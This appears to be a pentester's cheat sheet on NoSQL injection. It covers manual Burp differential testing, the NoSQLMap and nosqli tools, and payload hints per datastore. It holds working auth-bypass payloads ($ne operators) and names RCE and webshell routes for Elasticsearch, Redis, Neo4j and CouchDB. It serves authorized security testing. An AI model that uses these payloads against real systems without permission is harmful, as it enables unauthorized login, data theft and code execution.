# NoSQLMap + nosqli + manual — cheat-sheet (authorized only)

Automated NoSQLi tools are **noisy** — run them against a **lab/mock first**, and prefer **manual, control-baselined**
testing on real targets (Burp Repeater + the differential test) to stay low-FP and low-noise. One proven impact
(login without password / extracted secret / executed JS) beats a wall of "maybe" output.

---

## Manual-first (the reliable path)

```
# 1) operator differential in Burp Repeater — send TRUE vs FALSE, diff status/length:
username[$ne]=x&password[$ne]=x            # form
{"username":{"$ne":null},"password":{"$ne":null}}   # JSON
# 2) if login flips to success -> auth bypass. If a param's TRUE!=FALSE -> injectable.
# 3) blind: poc/nosqli_blind.py (regex/where-time) to extract a secret you own.
```
Turn on Burp's **Content-Type converter** to flip JSON<->form quickly; that alone bypasses many filters.

## NoSQLMap (https://github.com/codingo/NoSQLMap)

```
python nosqlmap.py
# interactive: set target host/port/URL, HTTP method, and the injectable parameter
# capabilities:
#   - MongoDB/CouchDB detection
#   - authentication bypass ($ne / $gt attacks)
#   - $where / JS injection & timing
#   - blind data extraction
#   - (has DB-attack modules that touch the DB directly - DO NOT use on prod without authorization)
```
Notes: dated (Python2-ish forks exist), best in a lab. Use it to *learn* the payloads, then reproduce the winning one
manually so your report is clean and reproducible.

## nosqli (Go — https://github.com/Charlie-belmer/nosqli)

```
nosqli scan -t "https://target/api/search?q=test"          # GET param scan
nosqli scan -t "https://target/login" -r request.txt        # from a saved request (POST/JSON)
# focused MongoDB detector: error-based, boolean, and $where; lower noise than NoSQLMap
```
Good first-pass automation for MongoDB; still confirm manually.

## Supporting tools

| Tool | Use |
|------|-----|
| **Burp Suite** (Repeater/Intruder + CT converter) | The primary manual tool; differential + content-type switching |
| **poc/nosqli_fuzz.py** | Control-baselined auth-bypass + operator differential (low-FP) |
| **poc/nosqli_blind.py** | Blind `$regex`/`$where`-time char-by-char extraction |
| **mongosh / local MongoDB** | Reproduce the query locally to understand operator semantics |
| **Interactsh / OOB** | Confirm `$where` timing, or Neo4j/ES/Redis SSRF-RCE callbacks |
| **ffuf** | Discover login/search/API endpoints that reach queries |

## Datastore quick-switch (don't spray Mongo payloads at everything)
```
MongoDB       -> $ne/$gt/$regex/$where (this kit's core)
CouchDB       -> Mango selectors {"$gt":null}; CVE-2017-12635 admin creation
Elasticsearch -> _search DSL injection; script RCE (CVE-2015-1427/2014-3120)
Redis         -> CRLF/command injection via SSRF; CONFIG SET+SAVE webshell; EVAL Lua
Neo4j         -> Cypher ' OR 1=1 // ; LOAD CSV / apoc -> SSRF/file/RCE
DynamoDB      -> PartiQL ' OR '1'='1
Firebase      -> open rules; REST /*.json read/write
```

> Automated tools find candidates; **you** prove impact. Own/test accounts, bounded sleeps, no prod DB-attack modules,
> redact extracted secrets. Authorized targets only.
